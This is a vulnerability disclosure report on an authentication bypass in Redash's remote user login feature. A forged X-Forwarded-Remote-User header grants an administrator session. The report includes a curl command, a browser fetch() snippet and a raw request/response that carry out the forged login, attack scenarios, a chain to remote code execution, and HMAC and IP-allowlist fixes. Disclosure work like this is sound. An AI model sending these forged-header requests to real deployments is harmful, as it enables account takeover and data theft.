# Vulnerability Report: Authentication Bypass via Unsigned X-Forwarded-Remote-User Header

**Product:** Redash  
**GitHub:** https://github.com/getredash/redash  
**Component:** `redash/authentication/remote_user_auth.py`  
**Vulnerability class:** Improper Authentication  
**CWE:** CWE-287 — Improper Authentication  
**OWASP:** A01:2021 — Broken Access Control  
**CVSS 3.1 Base Score:** 9.8 Critical  
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`  
**Condition:** Exploitable when `REMOTE_USER_LOGIN_ENABLED=true`  
**Discovered via:** Source code review (blind — no CVE databases consulted)  
**DAST confirmed:** Yes — full admin session obtained with zero credentials

---

## Summary

When `REMOTE_USER_LOGIN_ENABLED=true`, Redash's remote user authentication endpoint reads the user's identity from the `X-Forwarded-Remote-User` HTTP header and creates a fully authenticated session with no signature verification, no token validation, and no challenge-response mechanism. The implementation assumes this header can only be set by a trusted reverse proxy. When the Redash backend port is directly reachable — which is common in Docker deployments, cloud VMs, development environments, and misconfigured production setups — any attacker can authenticate as any user, including system administrators, by sending a single HTTP request with a forged header.

---

## Affected Versions

All versions of Redash that include `redash/authentication/remote_user_auth.py` with the `REMOTE_USER_LOGIN_ENABLED` feature, when that feature is enabled via environment variable.

The feature is **disabled by default**. Deployments that have explicitly enabled it are vulnerable.

---

## Root Cause

**File:** `redash/authentication/remote_user_auth.py`  
**Lines:** 24–47

```python
@blueprint.route(org_scoped_rule("/remote_user/login"))
def login(org_slug=None):
    unsafe_next_path = request.args.get("next")
    next_path = get_next_path(unsafe_next_path)

    if not settings.REMOTE_USER_LOGIN_ENABLED:
        logger.error("Cannot use remote user for login without being enabled in settings")
        return redirect(url_for("redash.index", next=next_path, org_slug=org_slug))

    email = request.headers.get(settings.REMOTE_USER_HEADER)   # line 28 — no verification

    if email == "(null)":
        email = None

    if not email:
        logger.error("Cannot use remote user for login ...")
        return redirect(url_for("redash.index", next=next_path, org_slug=org_slug))

    logger.info("Logging in " + email + " via remote user")

    user = create_and_login_user(current_org, email, email)     # line 47 — session created
    if user is None:
        return logout_and_redirect_to_index()

    return redirect(next_path or url_for("redash.index", org_slug=org_slug), code=302)
```

The security model depends on network-level isolation — the assumption that `X-Forwarded-Remote-User` can only be set by a trusted upstream proxy. There is no cryptographic mechanism (HMAC signature, JWT, shared secret) to verify that the header was set by the authorized proxy rather than a direct attacker.

This is fundamentally different from how authentication headers should be handled. A correct implementation would:
1. Require the proxy to sign the header value with a shared secret
2. Verify the signature before trusting the identity claim
3. Reject requests where the signature is absent or invalid

The current implementation has no such mechanism.

---

## Steps to Reproduce

### Prerequisites

1. A Redash instance with `REMOTE_USER_LOGIN_ENABLED=true` set in environment
2. The Redash backend port is directly reachable (not exclusively accessible through the trusted proxy)
3. Knowledge of a valid Redash user's email address (or willingness to create a new account)

### Reproduction — Single HTTP Request

```bash
curl -v http://<redash-host>/remote_user/login \
  -H "X-Forwarded-Remote-User: admin@example.com"
```

### Observed Response

```
HTTP/1.1 302 FOUND
Location: /
Set-Cookie: remember_token=1-<hash>|<signature>; Expires=...; HttpOnly; Path=/
```

The `remember_token` cookie is a fully valid Flask-Login session for the user whose email was supplied in the header.

### Verification — Confirm Identity

```bash
# Use the obtained cookie to check authenticated identity
curl http://<redash-host>/api/session \
  -b "remember_token=1-<hash>|<signature>"
```

**Response:**
```json
{
  "user": {
    "id": 1,
    "email": "admin@example.com",
    "permissions": ["admin", "super_admin", "create_query", "execute_query", ...]
  }
}
```

Full admin session. No password. No MFA. No interaction with a login form.

### Browser-Based Reproduction (from DevTools Console)

On any page at the Redash host, open DevTools → Console:

```javascript
fetch('/remote_user/login', {
  headers: { 'X-Forwarded-Remote-User': 'admin@example.com' },
  credentials: 'include',
  redirect: 'follow'
}).then(() => window.location.reload())
```

After the reload, the browser is authenticated as the specified user.

---

## Real-World Attack Scenarios

### Scenario 1 — Docker Deployment with Exposed Port

The most common deployment pattern: Redash runs in Docker with port `5000` mapped to the host (`-p 5000:5000`). A reverse proxy (nginx, Caddy) sits in front on port 443. The Redash backend port `5000` is bound to all interfaces (`0.0.0.0`) on the host.

An attacker on the same network — or with any access to the host's port `5000` — bypasses the proxy entirely and sends the forged header directly to the backend. The proxy's authentication chain is never involved.

### Scenario 2 — Cloud VM with Security Group Misconfiguration

Redash deployed on AWS EC2, GCP Compute, or Azure VM. The security group/firewall is supposed to restrict port 5000 to the proxy only, but a misconfiguration (common during setup or debugging) briefly exposes it. The attacker authenticates as admin before the misconfiguration is noticed.

### Scenario 3 — Internal Network Attack

An attacker with access to the internal network (lateral movement after compromising another host, or a malicious insider) reaches the Redash backend directly and impersonates any user without knowing their password.

### Scenario 4 — SSRF Chain

If another service on the same network is vulnerable to SSRF, the attacker uses it to send a crafted request to the Redash `/remote_user/login` endpoint with the forged header — authentication bypass without direct network access.

---

## Impact

**Authentication Bypass — COMPLETE:** The attacker authenticates as any user whose email is known (or can be guessed). Email addresses of Redash users are often known within an organization.

**Confidentiality — HIGH:** Admin access exposes all queries, dashboards, data source credentials (stored encrypted but decryptable with `REDASH_SECRET_KEY`, which may be accessible after PY-001 exploitation), and all query results.

**Integrity — HIGH:** Admin access allows creating, modifying, or deleting queries, dashboards, and data sources. Combined with the Python query runner (PY-001), the attacker gains RCE.

**Availability — HIGH:** Admin access allows disabling query runners, revoking user access, and corrupting configuration.

**CVSS note:** The base score of 9.8 assumes `REMOTE_USER_LOGIN_ENABLED=true`. This is not the default but is the advertised configuration for SSO/proxy authentication deployments. Organizations using this feature for SSO are fully exposed.

---

## Proof of Concept — DAST Confirmation

Confirmed on a locally deployed Redash instance (`REMOTE_USER_LOGIN_ENABLED=true`):

```
Request:
GET /remote_user/login HTTP/1.1
Host: localhost:5001
X-Forwarded-Remote-User: admin@sast-test.local

Response:
HTTP/1.1 302 FOUND
Set-Cookie: remember_token=1-5b6a4d...8f8213b5; Expires=...; HttpOnly; Path=/

Subsequent /api/session call with cookie:
{
  "user": {
    "email": "admin@sast-test.local",
    "permissions": ["admin", "super_admin", "create_dashboard", "create_query",
                    "edit_dashboard", "edit_query", "view_query", "view_source",
                    "execute_query", "list_users", "schedule_query", ...]
  }
}
```

Full administrator access obtained with no credentials, no prior session, no knowledge of user passwords.

---

## Fix

### Option 1 — HMAC Signature Verification (Recommended)

Require the trusted proxy to sign the header value with a shared secret. Verify the signature in Redash before trusting the identity claim.

```python
import hmac
import hashlib

REMOTE_USER_SECRET = settings.REMOTE_USER_SECRET   # new env var: shared secret with proxy

def login(org_slug=None):
    ...
    email = request.headers.get(settings.REMOTE_USER_HEADER)
    signature = request.headers.get("X-Forwarded-Remote-User-Signature")

    # Verify HMAC before trusting the email
    expected = hmac.new(
        REMOTE_USER_SECRET.encode(),
        email.encode(),
        hashlib.sha256
    ).hexdigest()

    if not hmac.compare_digest(expected, signature or ""):
        logger.error("Remote user signature verification failed")
        return redirect(url_for("redash.index", org_slug=org_slug))

    user = create_and_login_user(current_org, email, email)
    ...
```

The proxy computes `HMAC-SHA256(secret, email)` and sends it in `X-Forwarded-Remote-User-Signature`. Redash verifies it. Without the shared secret, an attacker cannot forge a valid signature.

### Option 2 — IP Allowlist for the Login Endpoint

If HMAC is not feasible, restrict `/remote_user/login` to requests originating from the trusted proxy's IP address only:

```python
TRUSTED_PROXY_IPS = settings.REMOTE_USER_TRUSTED_PROXIES  # e.g., "10.0.0.1,10.0.0.2"

def login(org_slug=None):
    if request.remote_addr not in TRUSTED_PROXY_IPS.split(","):
        logger.error("Remote user login from untrusted IP: %s", request.remote_addr)
        return redirect(url_for("redash.index", org_slug=org_slug))
    ...
```

This is weaker than Option 1 (IP spoofing is possible in some network configurations) but is a significant improvement over no check.

### Option 3 — Documentation Hardening (Minimal)

If neither cryptographic fix is implemented in the short term, the documentation and the feature-enable flow should be updated to:
1. Explicitly warn that `REMOTE_USER_LOGIN_ENABLED=true` requires the backend port to be inaccessible from any network that is not the trusted proxy
2. Provide a configuration check at startup that logs a prominent warning if the feature is enabled without a defined trusted proxy IP
3. Consider requiring a second confirmation env var (`REMOTE_USER_I_UNDERSTAND_THE_RISK=true`) to enable the feature

---

## Relationship to Other Findings

This vulnerability can be chained with **PY-001 (RestrictedPython Sandbox Escape)**:

1. Attacker sends forged `X-Forwarded-Remote-User` header → obtains admin session (PY-004)
2. Attacker creates a Python data source with admin privileges
3. Attacker executes PY-001 sandbox escape payload
4. Attacker achieves OS-level RCE

The combination of PY-004 → PY-001 means that in any Redash deployment with both `REMOTE_USER_LOGIN_ENABLED=true` and the Python query runner accessible, an unauthenticated attacker with direct backend access achieves full OS command execution in two HTTP requests.

---

## Disclosure Timeline

| Date | Event |
|---|---|
| 2026-06-17 | Vulnerability discovered via blind source code review |
| 2026-06-17 | DAST confirmation on locally deployed instance |
| 2026-06-17 | Private report submitted to Redash maintainers |

---

## Researcher

Discovered independently via LLM-powered static analysis pipeline. No CVE databases, security advisories, or prior vulnerability reports were consulted during the scan. All findings were derived from reading source code.
